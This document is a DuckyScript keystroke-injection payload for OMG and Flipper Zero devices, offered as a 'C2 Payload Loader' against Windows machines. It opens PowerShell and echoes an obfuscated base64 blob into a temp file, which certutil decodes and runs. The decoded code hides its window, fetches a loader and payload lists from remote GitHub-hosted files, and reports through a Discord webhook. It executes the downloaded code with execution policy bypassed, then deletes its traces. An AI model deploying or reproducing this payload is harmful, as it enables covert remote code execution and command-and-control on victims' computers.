REM Title: BOOTSTRAP - C2 Payload Loader (pLoader) w Discord Reporting
REM Description: Bootstrap Payload for Remote (C2) Payload Loader with Discord Reporting.
REM    This allows the payload to be executed on OMG Basic and other Smaller Devices. All 
REM    inputs below are needed to start the script, unless know how to edit the Source. OMG
REM    and InfoSecREDD (REDD) are not responsible for the misuse of this Payload. This is 
REM    for Educational Purposes only.
REM AUTHOR: InfoSecREDD
REM Version: 0.2
REM Category: Execution (REMOTE)
REM Compatibility: Flipper Zero AND DuckyScript Devices
REM Target: Windows

REM To use on Flipper Zero REM the DUCKY_LANG US from line below
DUCKY_LANG US
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 2000
REM Put your Discord webhook below.
STRING $webhook = "DiscordWebhookHere"; 
REM C2 file must be hosted at GitHub unless you can edit the file. 1 = ON and 0 = OFF 
STRING $ccontrol = "C2FileHere";
REM Put your Remote List of Payloads below.
STRING $URLS = "URLFileListHere"; 
REM Put your Timer file below. 10-18000 Its counted in Minutes.
STRING $timer = "TimerFileHere"; 
REM OVERDRIVE - Overdrive allows the payloads to execute without prior payload finishing. 1 = ON and 0 = OFF
STRING $overdrive = "OverdriveFileHere"; 
REM Cross your fingers...
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo JFVSTCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaGFrNS9vbWctcGF5bG9hZHMvbWFzdGVyL3BheWxvYWRzL2xpYnJhcnkvZXhlY3V0aW9uL0MyLVBheWxvYWQtTG9hZGVyL0MyLXBMb2FkZXIudHh0Ig0KZnVuY3Rpb24gaU5ldENoayB7DQogICRMaWJMb2MgPSBbU3lzdGVtLk5ldC5XZWJSZXF1ZXN0XTo6Q3JlYXRlKCRVUkwpIA0KICAkTGliUmVzID0gJExpYkxvYy5HZXRSZXNwb25zZSgpDQogICRMaWJTdGF0ID0gW2ludF0kTGliUmVzLlN0YXR1c0NvZGUgDQogIGlmICgkTGliU3RhdCAtZXEgMjAwKQ0KICB7DQogICAgcmV0dXJuICR0cnVlOw0KICB9IA0KICBlbHNlDQogIHsNCiAgICByZXR1cm4gJGZhbHNlOw0KICB9DQp9DQokaVZhbCA9IChpTmV0Q2hrKSB8IE91dC1TdHJpbmcNCklmICggJGlWYWwgPSAiVHJ1ZSIgKQ0Kew0KICAkQ2hrID0gKChJbnZva2Utd2VicmVxdWVzdCAtVVJJICIkVVJMIiAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50IHwgT3V0LVN0cmluZykuVHJpbSgpDQp9IA0KZWxzZQ0Kew0KICBXcml0ZS1Ib3N0ICJFUlJPUiAzOiAgQ2hlY2sgSW50ZXJuZXQgQ29ubmVjdGlvbi4iDQogIGV4aXQgMA0KfQ0KJGkgPSAnW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coaW50IGhhbmRsZSwgaW50IHN0YXRlKTsnOw0KYWRkLXR5cGUgLW5hbWUgd2luIC1tZW1iZXIgJGkgLW5hbWVzcGFjZSBuYXRpdmU7DQpbbmF0aXZlLndpbl06OlNob3dXaW5kb3coKFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OkdldEN1cnJlbnRQcm9jZXNzKCkgfCBHZXQtUHJvY2VzcykuTWFpbldpbmRvd0hhbmRsZSwgMCk7DQokUkFOID0gLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgOCB8ICUge1tjaGFyXSRffSkNCiRSQU5mID0gLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgMSB8ICUge1tjaGFyXSRffSkNCiRkaXJfbmFtZSA9ICIkUkFOIg0KJHBhdGggPSAiJGVudjp0ZW1wXCRkaXJfbmFtZSINCiR0ZW1wRmlsZW5hbWUgPSAidC50eHQiDQokdGVtcEZpbGUgPSAiJHBhdGhcJHRlbXBGaWxlbmFtZSINCmlmICghKFRlc3QtUGF0aCAiJHBhdGgiKSkNCnsNCiAgTmV3LUl0ZW0gIiRwYXRoIiAtSXRlbVR5cGUgRGlyZWN0b3J5ICA+JG51bGwgMj4mMQ0KfQ0KaWYgKCEoVGVzdC1QYXRoICIkdGVtcEZpbGUiKSkNCnsNCiAgTmV3LUl0ZW0gLVBhdGggIiRwYXRoIiAtTmFtZSAiJHRlbXBGaWxlbmFtZSIgLUl0ZW1UeXBlIEZpbGUgID4kbnVsbCAyPiYxDQp9DQokZW5jRG93biA9ICgoSW52b2tlLXdlYnJlcXVlc3QgLVVSSSAiJFVSTCIgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKSB8IEZvckVhY2gtT2JqZWN0IHsgW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRfKSkgfQ0KJGV4ZURvd24gPSAiJGVuY0Rvd24iIHwgRm9yRWFjaC1PYmplY3QgeyBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJF8pKSB9IA0KIiRleGVEb3duIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAiJHRlbXBGaWxlIiAtQXBwZW5kDQokYmFzZTY0U3RyID0gJ2VjaG8gW0EtWmEtejAtOS8rXC1fXXsxMjUsfScNCiRkb3duQ29udCA9IEdldC1Db250ZW50IC1QYXRoICIke3RlbXBGaWxlfSIgLVJhdw0KJG1hdGNoID0gW3JlZ2V4XTo6TWF0Y2goIiRkb3duQ29udCIsICIkYmFzZTY0U3RyIikNCmlmICgkbWF0Y2guU3VjY2Vzcykgew0KICAkUkFOID0gLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgOCB8ICUge1tjaGFyXSRffSkNCiAgJFJBTmYgPSAtam9pbiAoKDY1Li45MCkgKyAoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCAxIHwgJSB7W2NoYXJdJF99KQ0KICAkZGlyX25hbWUgPSAiJFJBTiINCiAgJHBhdGggPSAiJGVudjp0ZW1wXCRkaXJfbmFtZSINCiAgJHRlbXBGaWxlbmFtZSA9ICJ0LnBzMSINCiAgJHRlbXBGaWxlID0gIiRwYXRoXCR0ZW1wRmlsZW5hbWUiDQogICRiYXNlNjRTdHJDb250ZW50ID0gJ1tBLVphLXowLTkrLz1dezEyNSx9Jw0KICAkbWF0Y2hDb250ZW50ID0gW3JlZ2V4XTo6TWF0Y2goIiRtb2RDb250IiwgIiRiYXNlNjRTdHJDb250ZW50IikNCiAgaWYgKCRtYXRjaENvbnRlbnQuU3VjY2Vzcykgew0KICAgICRleHRyYWN0ZWRTdHJpbmcgPSAkbWF0Y2hDb250ZW50LlZhbHVlDQogICAgaWYgKFRlc3QtUGF0aCAiJHRlbXBGaWxlIikNCiAgICB7DQogICAgICBSZW1vdmUtSXRlbSAtUGF0aCAiJHRlbXBGaWxlIiAtRm9yY2UgLVJlY3Vyc2UNCiAgICAgIE5ldy1JdGVtIC1QYXRoICIkcGF0aCIgLU5hbWUgIiR0ZW1wRmlsZW5hbWUiIC1JdGVtVHlwZSBGaWxlICA+JG51bGwgMj4mMQ0KICAgIH0NCiAgICAkZm9ybWF0cExvYWRlciA9IC1qb2luICRleHRyYWN0ZWRTdHJpbmcNCiAgICAkcExvYWRlclJhdyA9ICIkZm9ybWF0cExvYWRlciIgfCBGb3JFYWNoLU9iamVjdCB7IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkXykpIH0gDQogICAgJGZpeHBMb2FkZXIgPSAkcExvYWRlclJhdy5TdWJzdHJpbmcoMSkNCiAgICAiJGZpeHBMb2FkZXIiIHwgT3V0LUZpbGUgLUZpbGVQYXRoICIkdGVtcEZpbGUiIC1BcHBlbmQNCiAgfQ0KfQ0KU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1Bcmd1bWVudExpc3QgIi1Ob1Byb2ZpbGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgYCJgJHdlYmhvb2sgPSAnJHdlYmhvb2snO2AkY2NvbnRyb2wgPSAnJGNjb250cm9sJztgJHRpbWVyID0gJyR0aW1lcic7YCRvdmVyZHJpdmUgPSAnJG92ZXJkcml2ZSc7JiAnJHRlbXBGaWxlJ2AiIiAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIE1pbmltaXplZCA+JG51bGwgMj4mMQ0Kc2xlZXAgNQ0KaWYgKFRlc3QtUGF0aCAiJHBhdGgiKSB7DQpSZW1vdmUtSXRlbSAtUGF0aCAiJHRlbXBGaWxlIiAtRm9yY2UgLVJlY3Vyc2UNClJlbW92ZS1JdGVtIC1QYXRoICIkcGF0aCIgLUZvcmNlIC1SZWN1cnNlDQp9DQpleGl0 > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
